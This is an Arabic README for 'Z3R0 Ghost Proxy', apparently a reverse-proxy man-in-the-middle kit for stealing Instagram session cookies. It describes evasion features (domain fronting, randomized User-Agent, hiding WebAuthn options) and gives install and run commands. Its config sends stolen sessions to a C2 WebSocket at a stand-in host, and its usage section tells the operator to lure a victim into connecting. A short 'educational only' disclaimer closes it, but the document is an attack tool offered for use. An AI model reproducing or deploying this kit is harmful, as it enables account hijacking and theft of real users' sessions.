# Z3R0 Ghost Proxy v3.0

أداة وسيط عكسي (Reverse Proxy) لاعتراض جلسات Instagram وسرقة ملفات تعريف الارتباط الخاصة بالجلسة (sessionid) عبر هجوم MITM متقدم.

**الميزات:**
- حقن Service Worker تلقائي لاعتراض الطلبات دون كسر JavaScript.
- دعم Domain Fronting عبر CDN.
- إخراج الجلسات المسروقة إلى خادم C2 عبر WebSocket.
- بصمة ديناميكية (User-Agent عشوائي).
- إخفاء خيارات WebAuthn.
- يعمل على Kali Linux و Termux.

## التثبيت

```bash
git clone https://github.com/your-user/z3r0-ghost-proxy.git
cd z3r0-ghost-proxy
chmod +x install.sh run.sh tools/gen_cert.sh
./install.sh
```

العداد

1. قم بتعديل config.json أو استخدم config.example.json:
   ```json
   {
     "target_host": "www.instagram.com",
     "c2_ws_url": "wss://c2.example.com/exfil"
   }
   ```
2. (اختياري) ضع شهادة SSL حقيقية أو استخدم الأداة لتوليد شهادة ذاتية.

التشغيل

تشغيل سريع (مع SSL ذاتي)

```bash
./run.sh
```

تشغيل يدوي مع خيارات

```bash
python3 z3r0_ghost_proxy.py --host 0.0.0.0 --port 443 --ssl-cert cert.pem --ssl-key key.pem --config config.json
```

بدون SSL (للتجارب فقط):

```bash
python3 z3r0_ghost_proxy.py --port 8080
```

الاستخدام

اجعل الضحية يتصل بالخادم الوكيل (عبر الرابط المباشر أو عبر إعدادات الشبكة). عند تسجيل الدخول إلى Instagram، سيتم التقاط sessionid وإرساله إلى خادم C2.

هيكل المستودع

· z3r0_ghost_proxy.py : الكود الرئيسي
· config.example.json : مثال للإعدادات
· requirements.txt : تبعيات Python
· install.sh / run.sh : نصوص تشغيل آلية
· tools/gen_cert.sh : توليد شهادة SSL

تنبيه

الأداة لأغراض تعليمية وبحثية فقط. الاستخدام غير المصرح به لاعتراض بيانات الآخرين يعد جريمة. أنت تتحمل كامل المسؤولية نحن نبرء الى لله ثم الى الناس من اعمالك